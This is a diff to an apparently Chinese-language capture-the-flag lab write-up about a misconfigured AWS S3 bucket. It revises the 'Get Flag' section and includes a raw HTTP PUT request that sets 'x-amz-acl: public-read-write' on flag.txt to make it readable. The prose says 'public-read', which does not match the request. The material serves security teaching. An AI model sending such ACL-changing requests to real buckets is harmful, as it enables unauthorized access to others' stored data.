@@ -27,26 +27,21 @@ terraform apply
 
 ## Get Flag
 
-![image-20220426152550418](../../../images/image-20220426152550418.png)
+尝试访问 flag.txt
 
-我们看到的文件的列表，尝试访问index.html
-
-![image-20220426152651701](../../../images/image-20220426152651701.png)
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
+```shell
+hxseclabnt4n4.s3.us-east-1.amazonaws.com/flag.txt
 ```
 
-禁止访问，但是我们可以通过PUT方法，在请求头中添加`x-amz-acl`中添加`public-read-write`来修改这个对象是否可以读或写
+![img](../../../images/1653022475.png)
 
-![image-20220426152744234](../../../images/image-20220426152744234.png)
+禁止访问，但是我们可以通过PUT方法，在请求头中添加`x-amz-acl`中添加`public-read`来修改这个对象的 acl
 
-![image-20220426172410852](../../../images/image-20220426172410852.png)
+![img](../../../images/1653022598.png)
 
 ```http
-PUT /index.html?acl HTTP/1.1
-Host: hxseclabteztq.s3.eu-west-1.amazonaws.com
+PUT /flag.txt?acl HTTP/1.1
+Host: hxsecxxxxx.s3.eu-west-1.amazonaws.com
 x-amz-acl: public-read-write
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -56,13 +51,9 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 ```
 
-然后我们再获取一下这个对象的ACL，会发现，现在所有用户都可以对其进行读写
+随后再访问这个 flag.txt，成功获取flag
 
-![image-20220426172506589](../../../images/image-20220426172506589.png)
-
-随后在访问这个index.html，成功获取flag
-
-![image-20220426172534934](../../../images/image-20220426172534934.png)
+![img](../../../images/1653022699.png)
 
 ## 销毁挑战
 
